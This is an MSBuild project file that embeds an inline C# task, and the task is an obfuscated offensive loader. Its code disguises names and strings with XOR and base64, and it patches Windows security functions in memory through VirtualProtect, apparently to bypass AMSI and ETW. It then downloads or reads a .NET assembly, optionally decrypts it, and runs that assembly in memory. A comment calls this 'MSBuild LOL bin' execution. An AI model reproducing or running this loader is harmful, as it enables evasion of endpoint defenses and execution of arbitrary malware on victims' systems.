<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample/>
  </Target>
  <UsingTask
  TaskName="ClassExample"
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
	      <![CDATA[	  

using System;using System.IO;using System.Net;using System.Text;using System.Reflection;using System.Runtime.InteropServices;using System.Linq;using System.Threading;//This if for MSBuild LOL bin stuff laterusing Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class MasterablePelado{    private static object[] SuperlabialMyrabalanus = null;
	[DllImport("kernel32")]
    private static extern IntPtr LoadLibrary(string ArctogaeanUngiant);
	[DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr EpidymidesInforming, string RefrigeratedKeyway);
	[DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr PhilodendronInspeak, UIntPtr LiggatPreexistence, uint UnsunnedKindergartener, out uint UntruthfulnessBoult);
	private static byte[] NeurinomasUncourtesy(string MysticalnessEaglewood)
    {
        byte[] ErosionsShaftfoot = null;
        FileStream fs = new FileStream(MysticalnessEaglewood,
                                       FileMode.Open,
                                       FileAccess.Read);
        BinaryReader br = new BinaryReader(fs);
        long UnpotentlyStooks = new FileInfo(MysticalnessEaglewood).Length;
        ErosionsShaftfoot = br.ReadBytes((int)UnpotentlyStooks);
        return ErosionsShaftfoot;
    }
	private static IntPtr WhippowillUpapurana(IntPtr GirdingSublayer)
    {
        uint OutsplendorAutographs = 0;
        if (VirtualProtect(GirdingSublayer, (UIntPtr)RehbocContangential().Length, 0x40, out OutsplendorAutographs))
        {
            return GirdingSublayer;
        }
        else
        {
            return (IntPtr)0;
        }
    }
	private static IntPtr ManglinglyCopraemia()
    {
        return GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("KQIKDUsKHyo="), "HoydensFoollike"))), Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("ER8aBDIRLwc2BwkBABw="), "PrimarNitrogens")));
    }
	private static MethodInfo ZymurgiesSluggardy(Assembly asm)
    {
        return asm.EntryPoint;
    }
	private static byte[] AleukemicPepsinating(HttpWebRequest BrashlyOrtyginae)
    {
		var BarbequingDelesseriaceous = BrashlyOrtyginae.GetResponse();
        MemoryStream ms = new MemoryStream();
        var MetantimoniteInternally = BarbequingDelesseriaceous.GetResponseStream();
		MetantimoniteInternally.CopyTo(ms);
        return ms.ToArray();
    }
	private static void PhratorAstr()
    {
        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("AQYDAg1fQQ=="), "TubeheartedPickling")));
        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("BQAYBA1bRzRKG3dGPkgsSBYMGnBPEgYRXzpPSgkgBgtISwcHDQkiCiYTCRUPUUcibBMRDwRFUgEBPhILGjcAFQgURxw="), "PsychagogyArchwench")));
        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("HQxEDlpVSFkLERoNBgsvGQVMCg0THmQRDxYICCQMDB5MCBwdLQIPEAALJlgdBA0VUhgoDU4LHQ0kCkkcDRMTFCEVCxYaRSAKDEwOAAEcclVOAQcGLhwMCEI="), "AxillaryDandie")));
        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("ERFBFAAce0wpERgPDiMLDQBPHiAeBwwJEgQ/RQUCCwciDRIIAgFBOQ0NGE8MKAIHExVGByQJCR9PDzMJRjkjNEEoCw8eFh41CQJPTCsUPhFMDgpOJwMKDQMRBClFDhVPGikJRjkjNEEpAA8eFh41BQkPTA0ENEs="), "MellonAlfalfa")));
        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("ChVKBQQHHGpSIhc4BQYBCgENcAIOBDcMAgEAAVpwOwESPwIGAQAAVCQaClYmABMdSVMROQYHEyRBCxoGEhhwHR1WN0EyJylfVD8UTwI+BEcXDB0VIgtPAjlBCxoEF1o="), "VaguestProv")));
        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("EhtDFAYOH1NUNj0dGhwBGxMFQR4IAQwjChoQBkkZGhEdbR0cUx8UARpBDxsUGCMKAAEHSRgGVA0lDFMfABQWDAVOCxoDLx0XW1QkGRoAWS8MUxUAGR4GFgsNUw83Tw8ZGEkNGxMMIAwdBxxVFAYTTh0bCG4NBxsVGxVH"), "NonutilityMissourianism")));
    }
	private static string PrecinctionCustrel(string NonexertionEvectant, bool PiculsFraughting)
    {
        if (PiculsFraughting)
            NonexertionEvectant = Encoding.UTF8.GetString(Convert.FromBase64String(NonexertionEvectant));
        if (NonexertionEvectant.Trim().ToLower().Equals(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("PQ=="), "EnsepulcheredShellblowing"))))
            Environment.Exit(0);
        return NonexertionEvectant;
    }
	private static byte[] MedietyUnidentifying(string url)
    {
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)((int)SecurityProtocolType.Ssl3 + Convert.ToInt32(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("ZFhXRg=="), "WhereunderHedgetaper"))));
        HttpWebRequest BrashlyOrtyginae = (HttpWebRequest)WebRequest.Create(url);
		BrashlyOrtyginae.Method = Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("CCE7"), "OdontaspididaeJejunotomy"));
        BrashlyOrtyginae.Proxy.Credentials = CredentialCache.DefaultCredentials;
        var ManipulatingSulfohydrate = AleukemicPepsinating(BrashlyOrtyginae);
		return ManipulatingSulfohydrate;
    }
	public static void Main(string[] args)
    {
        if (args.Length > 0)
        {
            Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GUgvRBYpAwU9EhQFAk5JQQwDGxwLWBdPRx0QFiAGDwEEAA=="), "BirdhoodSublinear")));
            string BoreensScroo = "";
            string VintagingCrescented = "";
            string[] NoncontrollingEphelis = new string[] { };
            bool IsopropenylOrangeades = false;
            bool PseudoassertiveFyttes = false;
            GenitalsParlousness();
            foreach (string argument in args)
            {
                if (argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("bF8JYVs="), "ArkWorriting")) || argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("fw1MTg=="), "RozzersWhuskie")))
                {
                    Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GVk4TjI8H0MJFwkBLxcLGgBwEhENRSwVMRdTWlM1HQAHAQsQblIBCxA/FwoGAk4AKhcIThw+UxcAAE4SLgs="), "BrensPschent")));
                    IsopropenylOrangeades = true;
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("bB4bIQ=="), "AftSpewers")) || argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("fUEdBhM="), "PleiadsTwankay")))
                {
                    PseudoassertiveFyttes = true;
                    int FloorageAuth = Array.IndexOf(args, argument) + 1;
                    if (FloorageAuth < args.Length)
                    {
                        string ReconvictErythremia = args[FloorageAuth];
                        if (IsopropenylOrangeades)
                            BoreensScroo = Encoding.UTF8.GetString(Convert.FromBase64String(ReconvictErythremia));
                        else
                            BoreensScroo = ReconvictErythremia;
                    }
                    Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GUQuUCsXChMXIhEaBwlMMSQ3YgodEx0LGRULNkURAAANGxJFNxwaHghSAgQXckIIWRNL"), "BosporianResinlike")), BoreensScroo);
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("aB4FEQk="), "EndearmentsSuling")) || argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("bl8VBR0K"), "CrediblyGrading")))
                {
                    int FloorageAuth = Array.IndexOf(args, argument) + 1;
                    if (FloorageAuth < args.Length)
                    {
                        string ProlectiteAfd = args[FloorageAuth];
                        if (IsopropenylOrangeades)
                            VintagingCrescented = Encoding.UTF8.GetString(Convert.FromBase64String(ProlectiteAfd));
                        else
                            VintagingCrescented = ProlectiteAfd;
                    }
                }
                if (argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("aA8GCBc="), "EntodermMisanswer")) || argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("YlgVFQYe"), "OutgamblingResorbs")))
                {
                    int ObjectlesslyImperation = Array.IndexOf(args, argument) + 1;
                    int TyrtaeanPseudogenuses = args.Length - ObjectlesslyImperation;
                    NoncontrollingEphelis = new String[TyrtaeanPseudogenuses];
                    for (int i = 0; i < TyrtaeanPseudogenuses; i++)
                    {
                        string ProlectiteAfdArgs = args[ObjectlesslyImperation + i];
                        if (IsopropenylOrangeades)
                            NoncontrollingEphelis[i] = Encoding.UTF8.GetString(Convert.FromBase64String(ProlectiteAfdArgs));
                        else
                            NoncontrollingEphelis[i] = ProlectiteAfdArgs;
                    }
                }
            }
            if (string.IsNullOrEmpty(VintagingCrescented))
            {
                PhratorAstr();
                Environment.Exit(0);
            }
            TredecaphobiaSliverlike(VintagingCrescented, NoncontrollingEphelis, PseudoassertiveFyttes, BoreensScroo);
            Environment.Exit(0);
        }
    }
	private static bool AvalonRahanwin(ConsoleKey ZooplastyTriglyceride)
    {
        if (ZooplastyTriglyceride == ConsoleKey.X)
            Environment.Exit(0);
        return (ZooplastyTriglyceride == ConsoleKey.Y);
    }
	private static Assembly GassersTympanomaxillary(byte[] DeclasseeTasco)
    {
        return Assembly.Load(DeclasseeTasco);
    }
	private static byte[] RehbocContangential()
    {
        if (!ImpervialPredaylight())
            return Convert.FromBase64String(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("Pi4WLSZVATcyJSR2"), "KhuldaEtude")));
        return Convert.FromBase64String(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("Iy8NKCFBKDA="), "VinicultureMansions")));
    }
	private static void GonosomeAche(byte[] ManipulatingSulfohydrate)
    {
        ((MethodInfo)TwelfthsHoydenhood(ZymurgiesSluggardy(GassersTympanomaxillary(ManipulatingSulfohydrate)))).Invoke(null, SuperlabialMyrabalanus);
    }
	private static void IodoformEugenical()
    {
        IntPtr GirdingSublayer = WhippowillUpapurana(ManglinglyCopraemia());
        if (GirdingSublayer != (IntPtr)0)
        {
            Marshal.Copy(RehbocContangential(), 0, GirdingSublayer, RehbocContangential().Length);
            Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("DkUtUjwDDAgMHRQ1Fh4JHEMYBBA2BhUWTzciOCBP"), "UnprovokingScreeched")));
        }
        else
        {
            Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GUg+SDkTPQ0LBhwVRSI5PSxTNQMgLy0t"), "BichirIncorrectness")));
        }
    }
	private static void GenitalsParlousness()
    {
        var DyvourBombycina = GastlyMisleadable();
        uint FrequenterFungous;
        var MudpackScrappiest = LoadLibrary(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("KxgBDxhcCwED"), "ElectromobilePegmatize")));
        var ScatterplotsAllokinetic = GetProcAddress(MudpackScrappiest, Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("Ax0VNx8JAhEzIgYYHA=="), "FibrilledPolysalicylide")));
        if (VirtualProtect(ScatterplotsAllokinetic, (UIntPtr)DyvourBombycina.Length, 0x40, out FrequenterFungous))
        {
            Marshal.Copy(DyvourBombycina, 0, ScatterplotsAllokinetic, DyvourBombycina.Length);
            Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("CEIxVjIbFhA3FgYSHAAFA0EBBwcBPAIJEkErISRz"), "SilvanusReutilization")));
        }
    }
	private static void UmbrousFeigners(byte[] ManipulatingSulfohydrate, string BoreensScroo)
    {
        ((MethodInfo)TwelfthsHoydenhood(ZymurgiesSluggardy(GassersTympanomaxillary(BluebuckChinche(ManipulatingSulfohydrate, BoreensScroo))))).Invoke(null, SuperlabialMyrabalanus);
    }
	private static object TwelfthsHoydenhood(MethodInfo OrnithophilistReexpelling)
    {
        return OrnithophilistReexpelling;
    }
	private static bool ImpervialPredaylight()
    {
        if (IntPtr.Size == 4)
            return false;
        return true;
    }
	private static byte[] BluebuckChinche(byte[] NonexertionEvectant, string UkelelesLaughed)
    {
        //byte[] keyBytes = Encoding.UTF8.GetBytes(UkelelesLaughed);
        byte[] YourselfHumidified = new byte[NonexertionEvectant.Length];
        for (int i = 0; i < NonexertionEvectant.Length; i++)
        {
            YourselfHumidified[i] = (byte)(NonexertionEvectant[i] ^ Encoding.UTF8.GetBytes(UkelelesLaughed)[i % Encoding.UTF8.GetBytes(UkelelesLaughed).Length]);
        }
        return YourselfHumidified;
    }
	private static byte[] GastlyMisleadable()
    {
        if (!ImpervialPredaylight())
            return Convert.FromBase64String(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("OQclLg=="), "NotodontoidHyperintelligent")));
        return Convert.FromBase64String(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("Mx5LXA=="), "DivaricatedPolygamical")));
    }
	private static Type FleabanesEndolabyrinthitis(MethodInfo OrnithophilistReexpelling)
    {
        return OrnithophilistReexpelling.ReflectedType;
    }
	private static void TredecaphobiaSliverlike(string MangosteenGomuti, string[] FivefoldWentletrap, bool PseudoassertiveFyttesoded = false, string BoreensScroo = "")
    {
        IodoformEugenical();
       if (MangosteenGomuti.Length > 1){
			if (!string.IsNullOrEmpty(string.Join(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("cA=="), "PtarmicaBetassel")), FivefoldWentletrap))) { 
				Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GF4xVDwhOGcpLTsrSVlI"), "CultistHylocichla")) + MangosteenGomuti);
				Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("EkUuQS0HBQcEChsHH1l+SQ=="), "InsalubriouslyDiscs")) + string.Join(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("cA=="), "PtarmicaBetassel")), FivefoldWentletrap));
			}
			else 
			{
			   Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GF4xVDwhOGcpLTsrSVlI"), "CultistHylocichla")) + MangosteenGomuti);
			   Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("EkUuQS0HBQcEChsHH1l+SQ=="), "InsalubriouslyDiscs")) + string.Join(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("cA=="), "PtarmicaBetassel")), FivefoldWentletrap));
			}
			SuperlabialMyrabalanus = new object[] { FivefoldWentletrap };
			if (PseudoassertiveFyttesoded && MangosteenGomuti.ToLower().StartsWith(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("IBsVCA=="), "HoaxingOutstare"))))
			{
				UmbrousFeigners(MedietyUnidentifying(MangosteenGomuti), BoreensScroo);
			}
			else if (!PseudoassertiveFyttesoded && MangosteenGomuti.ToLower().StartsWith(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("IBsVCA=="), "HoaxingOutstare"))))
			{
				GonosomeAche(MedietyUnidentifying(MangosteenGomuti));
			}
			else if (!PseudoassertiveFyttesoded && !MangosteenGomuti.ToLower().StartsWith(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("IBsVCA=="), "HoaxingOutstare"))))
				GonosomeAche(NeurinomasUncourtesy(MangosteenGomuti));
			else
				UmbrousFeigners(NeurinomasUncourtesy(MangosteenGomuti), BoreensScroo);
	}
    }
	    
	     //This is for MSBuild later
	    public class ClassExample : Task, ITask
	    {
	        public override bool Execute()
	        {
	            MasterablePelado.Main(new string[] { });
	            return true;
	        }
	    }
	    
}

 ]]>
	</Code>	  
    </Task>
  </UsingTask>
</Project>